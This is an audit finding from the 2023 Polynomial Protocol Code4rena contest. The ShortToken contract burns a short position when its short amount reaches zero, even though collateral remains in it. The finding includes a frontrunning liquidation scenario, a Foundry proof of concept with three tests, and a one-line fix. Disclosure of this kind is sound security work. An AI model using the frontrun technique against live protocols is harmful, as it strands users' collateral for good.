---
tags:
  - lang/solidity
  - sector/lending
  - sector/nft
  - sector/token
  - platform/code4rena
  - has/github
  - has/poc
  - severity/high
  - impact/mev/frontrun
protocol: "[[Polynomial Protocol]]"
auditors:
  - "[[Bauer]]"
report: "https://code4rena.com/reports/2023-03-polynomial"
genome:
  - "[[wrong-condition]]"
  - "[[frontrun]]"
  - "[[frontrun-exposure]]"
  - "[[liquidation-underwater]]"
---
# [H-03] Short positions can be burned while holding collateral

- id: 20226
- impact: HIGH
- protocol: [[Polynomial Protocol]]
- reporter: Bauer (Code4rena)
- source: https://code4rena.com/reports/2023-03-polynomial

## Summary


A vulnerability has been identified in the `ShortToken` contract, where users can permanently lose a portion of their collateral due to a malicious attacker or their own mistake. The `adjustPosition()` function in the `ShortToken` contract handles changes to a short position's short or collateral amounts, and if a position's `shortAmount` is set to 0, it will be burned without ensuring `collateralAmount` is not 0 before burning. This can result in a position's owner losing all remaining collateral in the position, as its corresponding `ShortToken` no longer has an owner. 

There are three realistic scenarios where a position with collateral could be burned: 1) A user reduces his position's `shortAmount` to 0 without withdrawing all of its collateral; 2) An attacker fully liquidates a short position; 3) An attacker frontruns a user's `closeTrade()` transaction with a liquidation. 

The recommended mitigation is to ensure that positions cannot be burned if they have any collateral by adding an additional condition to the `adjustPosition()` function.

## Details


Users can permanently lose a portion of their collateral due to a malicious attacker or their own mistake.

### Vulnerability Details

In the `ShortToken` contract, `adjustPosition()` is used to handle changes to a short position's short or collateral amounts. The function also handles the burning of positions with the following logic:

```solidity
position.collateralAmount = collateralAmount;
position.shortAmount = shortAmount;

if (position.shortAmount == 0) {
    _burn(positionId);
}
```

Where:

*   `collateralAmount` - New amount of collateral in a position.
*   `shortAmount` - New short amount of a position.
*   `positionId` - ERC721 `ShortToken` of a short position.

As seen from above, if a position's `shortAmount` is set to 0, it will be burned. Furthermore, as the code does not ensure `collateralAmount` is not 0 before burning, it is possible to burn a position while it still has collateral.

If this occurs, the position's owner will lose all remaining collateral in the position. This remaining amount will forever be stuck in the position as its corresponding `ShortToken` no longer has an owner.

### Proof of Concept

In the `Exchange` contract, users can reduce a position's `shortAmount` using `closeTrade()` (`Exchange.sol#L100-L109`) and `liquidate()` (`Exchange.sol#L140-L148`). With these two functions, there are three realistic scenarios where a position with collateral could be burned.

**1. User reduces his position's `shortAmount` to 0**

A user might call `closeTrade()` on a short position with the following parameters:

*   `params.amount` - Set to the position's short amount.
*   `params.collateralAmount` - Set to any amount less than the position's total collateral amount.

This would reduce his position's `shortAmount` to 0 without withdrawing all of its collateral, causing him to lose the remaining amount.

Although this could be considered a user mistake, such a scenario could occur if a user does not want to hold a short position temporarily without fully withdrawing his collateral.

**2. Attacker fully liquidates a short position**

In certain situations, it is possible for a short position to have collateral remaining after a full liquidation (example in the coded PoC below). This collateral will be lost as full liquidations reduces a position's `shortAmount` to 0, thereby burning the position.

**3. Attacker frontruns a user's `closeTrade()` transaction with a liquidation**

Consider the following scenario:

*   Alice has an unhealthy short position that is under the liquidation ratio and can be fully liquidated.
*   To bring her position back above the liquidation ratio, Alice decides to partially reduce its short amount. She calls `closeTrade()` on her position with the following parameters:
    *   `params.amount` - Set to 40% of the position's short amount.
    *   `params.collateralAmount` - Set to 0.
*   A malicious attacker, Bob, sees her `closeTrade()` transaction in the mempool.
*   Bob frontruns the transaction, calling `liquidate()` with the following parameters:
    *   `positionId` - ID of Alice's position.
    *   `debtRepaying` - Set to 60% of Alice's position's short amount.
*   Bob's `liquidate()` transaction executes first, reducing the short amount of Alice's position to 40% of the original amount.
*   Alice's `closeTrade()` transaction executes, reducing her position's short amount by 40% of the original amount, thus its `shortAmount` becomes 0.

In the scenario above, Alice loses the remaining collateral in her short position as it is burned after `closeTrade()` executes.

Note that this attack is possible as long as an attacker can liquidate the position's remaining short amount. For example, if Alice calls `closeTrade()` with 70% of the position's short amount, Bob only has to liquidate 30% of its short amount.

**Coded PoC**

The code below contains three tests that demonstrates the scenarios above:

1.  `testCloseBurnsCollateral()`
2.  `testLiquidateBurnsCollateral()`
3.  `testAttackerFrontrunLiquidateBurnsCollateral()`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

import {TestSystem, Exchange, ShortToken, ShortCollateral, MockERC20Fail} from "./utils/TestSystem.sol";

contract PositionWithCollateralBurned is TestSystem {
    // Protocol contracts
    Exchange private exchange;
    ShortToken private shortToken;
    ShortCollateral private shortCollateral;

    // sUSD token contract
    MockERC20Fail private SUSD;

    // Intial base asset price
    uint256 private constant initialBaseAssetPrice = 1e18;

    // Users
    address private USER = user_1;
    address private ATTACKER = user_2;

    function setUp() public {
        // Deploy contracts
        deployTestSystem();
        initPool();
        initExchange();
        preparePool();

        exchange = getExchange();
        shortToken = getShortToken();
        shortCollateral = getShortCollateral();
        SUSD = getSUSD();

        // Set initial price for base asset
        setAssetPrice(initialBaseAssetPrice);

        // Mint sUSD for USER
        SUSD.mint(USER, 1e20);

        // Mint powerPerp for ATTACKER
        vm.prank(address(exchange));
        getPowerPerp().mint(ATTACKER, 1e20);
    }

    function testCloseBurnsCollateral() public {
        // Open short position
        uint256 shortAmount = 1e18;
        uint256 collateralAmount = 1e15;
        uint256 positionId = openShort(shortAmount, collateralAmount, USER);

        // Fully close position without withdrawing any collateral
        closeShort(positionId, shortAmount, 0, USER);

        // positionId still holds 1e15 sUSD as collateral
        (,, uint256 remainingCollateralAmount, ) = shortToken.shortPositions(positionId);
        assertEq(remainingCollateralAmount, collateralAmount);

        // positionId is already burned (ie. ownerOf reverts with "NOT_MINTED")
        vm.expectRevert("NOT_MINTED");
        shortToken.ownerOf(positionId);
    }

    function testLiquidateBurnsCollateral() public {
        // USER opens short position with amount = 1e18, collateral amount = 1e15
        uint256 shortAmount = 1e18;
        uint256 positionId = openShort(1e18, 1e15, USER);

        // Base asset price rises by 35%
        setAssetPrice(initialBaseAssetPrice * 135 / 100);

        // USER's entire short position is liquidatable
        assertEq(shortCollateral.maxLiquidatableDebt(positionId), shortAmount);

        // ATTACKER liquidates USER's entire short position
        vm.prank(ATTACKER);
        exchange.liquidate(positionId, shortAmount);

        // positionId has no remaining debt, but still holds some collateral
        (, uint256 remainingAmount, uint256 remainingCollateralAmount, ) = shortToken.shortPositions(positionId);
        assertEq(remainingAmount, 0);
        assertGt(remainingCollateralAmount, 0);

        // positionId is already burned (ie. ownerOf reverts with "NOT_MINTED")
        vm.expectRevert("NOT_MINTED");
        shortToken.ownerOf(positionId);
    }

    function testAttackerFrontrunLiquidateBurnsCollateral() public {
        // USER opens short position with amount = 1e18, collateral amount = 1e15
        uint256 shortAmount = 1e18;
        uint256 positionId = openShort(1e18, 1e15, USER);

        // Base asset price rises by 40%
        setAssetPrice(initialBaseAssetPrice * 140 / 100);

        // USER's short position is liquidatable
        assertEq(shortCollateral.maxLiquidatableDebt(positionId), shortAmount);

        // ATTACKER frontruns USER's closeTrade() transaction, liquidating 60% of USER's amount
        vm.prank(ATTACKER);
        exchange.liquidate(positionId, shortAmount * 60 / 100);

        // USER's closeTrade() transaction executes, reducing shortAmount by the remaining 40%
        closeShort(positionId, shortAmount * 40 / 100, 0, USER);

        // positionId has no remaining debt, but still holds some collateral
        (, uint256 remainingAmount, uint256 remainingCollateralAmount, ) = shortToken.shortPositions(positionId);
        assertEq(remainingAmount, 0);
        assertGt(remainingCollateralAmount, 0);

        // positionId is already burned (ie. ownerOf reverts with "NOT_MINTED")
        vm.expectRevert("NOT_MINTED");
        shortToken.ownerOf(positionId);
    }

    function openShort(
        uint256 amount,
        uint256 collateralAmount,
        address user
    ) internal returns (uint256 positionId) {
        Exchange.TradeParams memory tradeParams;
        tradeParams.amount = amount;
        tradeParams.collateral = address(SUSD);
        tradeParams.collateralAmount = collateralAmount;

        vm.startPrank(user);
        SUSD.approve(address(exchange), collateralAmount);
        (positionId, ) = exchange.openTrade(tradeParams);
        vm.stopPrank();
    }

    function closeShort(
        uint256 positionId,
        uint256 amount,
        uint256 collateralAmount,
        address user
    ) internal {
        Exchange.TradeParams memory tradeParams;
        tradeParams.amount = amount;
        tradeParams.collateral = address(SUSD);
        tradeParams.collateralAmount = collateralAmount;
        tradeParams.maxCost = 100e18;
        tradeParams.positionId = positionId;

        vm.startPrank(user);
        SUSD.approve(address(getPool()), tradeParams.maxCost);
        exchange.closeTrade(tradeParams);
        vm.stopPrank();
    }
}
```

### Recommended Mitigation

Ensure that positions cannot be burned if they have any collateral:

```diff
-            if (position.shortAmount == 0) {
+            if (position.shortAmount == 0 && position.collateralAmount == 0) {
                 _burn(positionId);
             }
```

**[mubaris (Polynomial) confirmed via duplicate issue `#65`](https://github.com/code-423n4/2023-03-polynomial-findings/issues/65#issuecomment-1496079042)**

**[Dravee (judge) commented](https://github.com/code-423n4/2023-03-polynomial-findings/issues/206#issuecomment-1540495366):**
 > The 3rd scenario isn't likely due to frontrunning not being an issue on Optimism.<br>
> This report still brings the most value and is the most well presented.



***
